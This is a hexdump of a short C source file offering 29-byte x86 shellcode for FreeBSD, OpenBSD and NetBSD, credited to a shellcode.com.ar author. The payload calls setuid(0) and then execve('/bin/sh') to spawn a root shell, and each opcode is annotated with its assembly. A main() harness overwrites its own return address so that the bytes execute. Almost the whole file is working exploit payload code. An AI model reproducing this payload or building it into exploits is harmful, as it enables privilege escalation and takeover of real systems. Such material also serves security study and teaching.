00000000  2f 2a 0d 0a 20 20 20 2a  42 53 44 20 76 65 72 73  |/*..   *BSD vers|
00000010  69 6f 6e 0d 0a 20 20 20  46 72 65 65 42 53 44 2c  |ion..   FreeBSD,|
00000020  20 4f 70 65 6e 42 53 44  2c 20 4e 65 74 42 53 44  | OpenBSD, NetBSD|
00000030  2e 0d 0a 0d 0a 20 20 20  73 30 74 34 69 70 76 36  |.....   s0t4ipv6|
00000040  40 73 68 65 6c 6c 63 6f  64 65 2e 63 6f 6d 2e 61  |@shellcode.com.a|
00000050  72 0d 0a 0d 0a 20 20 20  32 39 20 62 79 74 65 73  |r....   29 bytes|
00000060  2e 0d 0a 0d 0a 20 20 20  2d 73 65 74 75 69 64 28  |.....   -setuid(|
00000070  30 29 3b 0d 0a 20 20 20  2d 65 78 65 63 76 65 28  |0);..   -execve(|
00000080  2f 62 69 6e 2f 73 68 29  3b 0d 0a 2a 2f 0d 0a 0d  |/bin/sh);..*/...|
00000090  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
000000a0  5d 3d 0d 0a 0d 0a 20 20  20 22 5c 78 33 31 5c 78  |]=....   "\x31\x|
000000b0  63 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c0"             |
000000c0  20 20 20 20 20 20 20 20  20 2f 2f 20 78 6f 72 20  |         // xor |
000000d0  20 20 20 20 20 20 20 20  20 25 65 61 78 2c 25 65  |         %eax,%e|
000000e0  61 78 0d 0a 20 20 20 22  5c 78 35 30 22 20 20 20  |ax..   "\x50"   |
000000f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000100  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000110  20 20 20 20 20 20 20 25  65 61 78 0d 0a 20 20 20  |       %eax..   |
00000120  22 5c 78 62 30 5c 78 31  37 22 20 20 20 20 20 20  |"\xb0\x17"      |
00000130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000140  2f 2f 20 6d 6f 76 20 20  20 20 20 20 20 20 20 20  |// mov          |
00000150  24 30 78 31 37 2c 25 61  6c 0d 0a 20 20 20 22 5c  |$0x17,%al..   "\|
00000160  78 35 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x50"            |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000180  20 70 75 73 68 20 20 20  20 20 20 20 20 20 25 65  | push         %e|
00000190  61 78 0d 0a 20 20 20 22  5c 78 63 64 5c 78 38 30  |ax..   "\xcd\x80|
000001a0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000001b0  20 20 20 20 20 20 20 2f  2f 20 69 6e 74 20 20 20  |       // int   |
000001c0  20 20 20 20 20 20 20 24  30 78 38 30 0d 0a 20 20  |       $0x80..  |
000001d0  20 22 5c 78 35 30 22 20  20 20 20 20 20 20 20 20  | "\x50"         |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001f0  20 2f 2f 20 70 75 73 68  20 20 20 20 20 20 20 20  | // push        |
00000200  20 25 65 61 78 0d 0a 20  20 20 22 5c 78 36 38 5c  | %eax..   "\x68\|
00000210  78 36 65 5c 78 32 66 5c  78 37 33 5c 78 36 38 22  |x6e\x2f\x73\x68"|
00000220  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000230  68 20 20 20 20 20 20 20  20 20 24 30 78 36 38 37  |h         $0x687|
00000240  33 32 66 36 65 0d 0a 20  20 20 22 5c 78 36 38 5c  |32f6e..   "\x68\|
00000250  78 32 66 5c 78 32 66 5c  78 36 32 5c 78 36 39 22  |x2f\x2f\x62\x69"|
00000260  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000270  68 20 20 20 20 20 20 20  20 20 24 30 78 36 39 36  |h         $0x696|
00000280  32 32 66 32 66 0d 0a 20  20 20 22 5c 78 38 39 5c  |22f2f..   "\x89\|
00000290  78 65 33 22 20 20 20 20  20 20 20 20 20 20 20 20  |xe3"            |
000002a0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
000002b0  20 20 20 20 20 20 20 20  20 20 25 65 73 70 2c 25  |          %esp,%|
000002c0  65 62 78 0d 0a 20 20 20  22 5c 78 35 30 22 20 20  |ebx..   "\x50"  |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002e0  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
000002f0  20 20 20 20 20 20 20 20  25 65 61 78 0d 0a 20 20  |        %eax..  |
00000300  20 22 5c 78 35 34 22 20  20 20 20 20 20 20 20 20  | "\x54"         |
00000310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000320  20 2f 2f 20 70 75 73 68  20 20 20 20 20 20 20 20  | // push        |
00000330  20 25 65 73 70 0d 0a 20  20 20 22 5c 78 35 33 22  | %esp..   "\x53"|
00000340  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000350  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000360  68 20 20 20 20 20 20 20  20 20 25 65 62 78 0d 0a  |h         %ebx..|
00000370  20 20 20 22 5c 78 35 30  22 20 20 20 20 20 20 20  |   "\x50"       |
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000390  20 20 20 2f 2f 20 70 75  73 68 20 20 20 20 20 20  |   // push      |
000003a0  20 20 20 25 65 61 78 0d  0a 20 20 20 22 5c 78 62  |   %eax..   "\xb|
000003b0  30 5c 78 33 62 22 20 20  20 20 20 20 20 20 20 20  |0\x3b"          |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6d  |            // m|
000003d0  6f 76 20 20 20 20 20 20  20 20 20 20 24 30 78 33  |ov          $0x3|
000003e0  62 2c 25 61 6c 0d 0a 20  20 20 22 5c 78 63 64 5c  |b,%al..   "\xcd\|
000003f0  78 38 30 22 3b 20 20 20  20 20 20 20 20 20 20 20  |x80";           |
00000400  20 20 20 20 20 20 20 20  20 20 2f 2f 20 69 6e 74  |          // int|
00000410  20 20 20 20 20 20 20 20  20 20 24 30 78 38 30 0d  |          $0x80.|
00000420  0a 0d 0a 6d 61 69 6e 28  29 0d 0a 7b 0d 0a 20 20  |...main()..{..  |
00000430  20 69 6e 74 20 2a 72 65  74 3b 0d 0a 20 20 20 70  | int *ret;..   p|
00000440  72 69 6e 74 66 28 22 53  68 65 6c 6c 63 6f 64 65  |rintf("Shellcode|
00000450  20 6c 65 6e 67 68 74 3d  25 64 5c 6e 22 2c 73 69  | lenght=%d\n",si|
00000460  7a 65 6f 66 28 73 68 65  6c 6c 63 6f 64 65 29 29  |zeof(shellcode))|
00000470  3b 0d 0a 20 20 20 72 65  74 3d 28 69 6e 74 2a 29  |;..   ret=(int*)|
00000480  26 72 65 74 2b 32 3b 0d  0a 20 20 20 28 2a 72 65  |&ret+2;..   (*re|
00000490  74 29 3d 28 69 6e 74 29  73 68 65 6c 6c 63 6f 64  |t)=(int)shellcod|
000004a0  65 3b 0d 0a 7d                                    |e;..}|
000004a5
